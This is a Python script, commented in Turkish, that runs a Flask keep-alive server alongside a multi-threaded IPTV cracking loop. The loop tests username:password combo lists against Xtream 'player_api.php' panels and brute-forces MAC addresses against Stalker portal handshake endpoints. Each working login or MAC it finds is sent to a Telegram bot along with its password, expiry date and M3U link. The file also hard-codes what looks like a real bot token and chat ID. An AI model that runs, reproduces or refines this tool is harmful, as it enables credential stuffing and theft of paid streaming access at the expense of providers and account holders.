import os
import time
import datetime
import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import ThreadPoolExecutor, as_completed

# SSL uyarılarını kapat
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

from flask import Flask
app = Flask('')

@app.route('/')
def home():
    return "IPTV & MAC Bot Aktif ve Hızlı (Multi-Thread) Modda Çalışıyor!"

TOKEN = "9296501081:AAG8COydawvxX-TfAEArbG-SdEtliP6WODM"
CHAT_ID = "-1003901042500"

def telegrama_gonder(mesaj):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"}
        res = requests.post(url, data=data, timeout=10)
        
        if res.status_code != 200:
            print(f"[!] Telegram mesajı iletilemedi! Kod: {res.status_code}, Cevap: {res.text}")
        else:
            print("[+] Telegram bildirimi başarıyla gönderildi.")
    except Exception as e:
        print(f"[!] Telegram bağlantı hatası: {e}")

HEADERd = {
    'Cookie': 'stb_lang=pt; timezone=America%2FNew_York;',
    'X-User-Agent': 'Model: MAG322; Link: Ethernet,WiFi',
    'Accept': '*/*',
    'Connection': 'Keep-Alive',
    'Accept-Encoding': 'gzip',
    'User-Agent': 'VLC/3.0.18 LibVLC/3.0.18',
}

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Optimize edilmiş session
session = requests.Session()
adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=1)
session.mount('http://', adapter)
session.mount('https://', adapter)

def m3u_tara_detayli(panel, user, pas):
    api_url = f"http://{panel}/player_api.php?username={user}&password={pas}"
    try:
        res = session.get(api_url, headers=HEADERd, timeout=(3, 5), verify=False)
        if res.status_code == 200 and 'user_info' in res.text:
            veri = str(res.text)
            if '"auth":1' in veri or '"status":"Active"' in veri:
                print(f"[+] HİT YAKALANDI! Panel: {panel} | User: {user}")
                
                try:
                    status = veri.split('status":')[1].split(',')[0].replace('"', '')
                except:
                    status = "Active"
                
                try:
                    acon = veri.split('active_cons":')[1].split(',')[0].replace('"', '')
                except:
                    acon = "?"
                
                try:
                    mcon = veri.split('max_connections":')[1].split(',')[0].replace('"', '')
                except:
                    mcon = "?"
                
                try:
                    bitis = veri.split('exp_date":')[1].split(',')[0].replace('"', '')
                    if bitis == 'null' or not bitis.isdigit():
                        bitis = 'Sınırsız'
                    else:
                        bitis = datetime.datetime.fromtimestamp(int(bitis)).strftime('%Y-%m-%d %H:%M:%S')
                except:
                    bitis = 'Bilinmiyor'

                try:
                    realm = veri.split('url":')[1].split(',')[0].replace('"', '')
                    port = veri.split('port":')[1].split(',')[0].replace('"', '')
                except:
                    realm, port = panel, "80"

                kanalsayisi, filmsayisi, dizisayisi = "0", "0", "0"
                try:
                    k_res = session.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_live_streams", timeout=2, verify=False)
                    kanalsayisi = str(k_res.text.count('stream_id'))
                    
                    v_res = session.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_vod_streams", timeout=2, verify=False)
                    filmsayisi = str(v_res.text.count('stream_id'))
                    
                    s_res = session.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_series", timeout=2, verify=False)
                    dizisayisi = str(s_res.text.count('series_id'))
                except:
                    pass

                m3ulink = f"http://{panel}/get.php?username={user}&password={pas}&type=m3u_plus"
                
                mesaj = (
                    f"🟢 <b>IPTV HİT BULUNDU! (Line)</b>\n"
                    f"🌐 <b>Ana Host:</b> http://{panel}\n"
                    f"🔗 <b>Real Host:</b> http://{realm}:{port}\n"
                    f"👤 <b>Kullanıcı:</b> <code>{user}</code>\n"
                    f"🔑 <b>Şifre:</b> <code>{pas}</code>\n"
                    f"📅 <b>Bitiş Tarihi:</b> {bitis}\n"
                    f"⚡ <b>Aktif/Max Bağlantı:</b> {acon} / {mcon}\n"
                    f"📊 <b>Durum:</b> {status}\n"
                    f"🎬 <b>Kanal:</b> {kanalsayisi} | <b>Film:</b> {filmsayisi} | <b>Dizi:</b> {dizisayisi}\n"
                    f"🔗 <b>M3U Plus Link:</b> {m3ulink}"
                )
                
                telegrama_gonder(mesaj)
                return True
    except:
        pass
    return False

# --- EKLENEN YENİ MAC TARAMA MODÜLÜ ---
def mac_tara_detayli(panel, mac):
    # Stalker Portal MAC doğrulama uç noktası (Stalker API standardı)
    mac_url = f"http://{panel}/stalker_portal/server/load.php?type=stb&action=handshake&mac={mac}"
    try:
        res = session.get(mac_url, headers=HEADERd, timeout=(3, 5), verify=False)
        if res.status_code == 200 and ('token' in res.text or 'js' in res.text or 'life' in res.text):
            print(f"[+] MAC HİT YAKALANDI! Panel: {panel} | MAC: {mac}")
            
            mesaj = (
                f"🟢 <b>STALKER MAC HİT BULUNDU!</b>\n"
                f"🌐 <b>Panel:</b> http://{panel}\n"
                f"💻 <b>MAC Adresi:</b> <code>{mac}</code>\n"
                f"🔗 <b>Portal Giriş:</b> http://{panel}/c/"
            )
            telegrama_gonder(mesaj)
            return True
    except:
        pass
    return False

def arka_plan_tarayici():
    print("[*] Bulut Otonom Hızlı ve MAC Destekli Tarayıcı Başlatıldı...")
    time.sleep(2)
    telegrama_gonder("🚀 <b>Hızlı Multi-Thread & MAC Tarayıcı Aktif!</b>\n⚡ Canlı Log ve Hata İzleme Modu Devrede.")
    
    combo_dir = os.path.join(BASE_DIR, 'combo')
    panel_dir = os.path.join(BASE_DIR, 'panel_list')
    mac_dir = os.path.join(BASE_DIR, 'mac_list')  # MAC adreslerinin okunacağı klasör
    
    while True:
        try:
            paneller = []
            if os.path.exists(panel_dir):
                for p_dosya in os.listdir(panel_dir):
                    if p_dosya.endswith('.txt'):
                        p_yol = os.path.join(panel_dir, p_dosya)
                        with open(p_yol, 'r', encoding='utf-8', errors='ignore') as pf:
                            for line in pf:
                                p_clean = line.strip().replace('http://', '').rstrip('/')
                                if p_clean:
                                    paneller.append(p_clean)

            if not paneller:
                paneller = ["ornekpanel.com:8080"]

            # 1. BÖLÜM: STANDART COMBO (USER:PASS) TARAMASI
            if os.path.exists(combo_dir):
                for dosya_adi in os.listdir(combo_dir):
                    if dosya_adi.endswith('.txt'):
                        dosya_yolu = os.path.join(combo_dir, dosya_adi)
                        print(f"\n[i] Taranan combo dosyası: {dosya_adi}")
                        
                        combolar = []
                        with open(dosya_yolu, 'r', encoding='utf-8', errors='ignore') as f:
                            for line in f:
                                line = line.strip()
                                if ':' in line:
                                    parts = line.split(':', 1)
                                    user = parts[0].strip()
                                    pas = parts[1].strip()
                                    if user and pas:
                                        combolar.append((user, pas))

                        print(f"[i] Toplam {len(combolar)} hesap, {len(paneller)} panel ile taranıyor...")
                        
                        chunk_size = 1000
                        toplam_chunk = (len(combolar) + chunk_size - 1) // chunk_size
                        
                        for idx, i in enumerate(range(0, len(combolar), chunk_size), 1):
                            chunk = combolar[i:i + chunk_size]
                            print(f"[i] İşleniyor (Combo): Chunk {idx}/{toplam_chunk} ({len(chunk)} hesap)...")
                            
                            with ThreadPoolExecutor(max_workers=20) as executor:
                                futures = [
                                    executor.submit(m3u_tara_detayli, panel, user, pas)
                                    for user, pas in chunk
                                    for panel in paneller
                                ]
                                for future in as_completed(futures):
                                    pass
                            
                            time.sleep(0.5)

            # 2. BÖLÜM: MAC ADRESİ TARAMASI (mac_list klasöründen otomatik okur)
            if os.path.exists(mac_dir):
                for dosya_adi in os.listdir(mac_dir):
                    if dosya_adi.endswith('.txt'):
                        dosya_yolu = os.path.join(mac_dir, dosya_adi)
                        print(f"\n[i] Taranan MAC dosyası: {dosya_adi}")
                        
                        mac_listesi = []
                        with open(dosya_yolu, 'r', encoding='utf-8', errors='ignore') as f:
                            for line in f:
                                mac_clean = line.strip()
                                if mac_clean:
                                    mac_listesi.append(mac_clean)

                        print(f"[i] Toplam {len(mac_listesi)} MAC adresi, {len(paneller)} panel ile taranıyor...")
                        
                        chunk_size = 1000
                        toplam_chunk = (len(mac_listesi) + chunk_size - 1) // chunk_size
                        
                        for idx, i in enumerate(range(0, len(mac_listesi), chunk_size), 1):
                            chunk = mac_listesi[i:i + chunk_size]
                            print(f"[i] İşleniyor (MAC): Chunk {idx}/{toplam_chunk} ({len(chunk)} MAC)...")
                            
                            with ThreadPoolExecutor(max_workers=20) as executor:
                                futures = [
                                    executor.submit(mac_tara_detayli, panel, mac)
                                    for mac in chunk
                                    for panel in paneller
                                ]
                                for future in as_completed(futures):
                                    pass
                            
                            time.sleep(0.5)
        
            print("\n[i] Tarama turu tamamlandı, 10 dakika sonra tekrar dönecek...")
            time.sleep(600)
        except Exception as e:
            print(f"[!] Tarama döngüsü hatası: {e}")
            time.sleep(30)

if __name__ == '__main__':
    import threading
    t = threading.Thread(target=arka_plan_tarayici)
    t.daemon = True
    t.start()
    
    print("[*] Flask Web Sunucusu Başlatılıyor...")
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))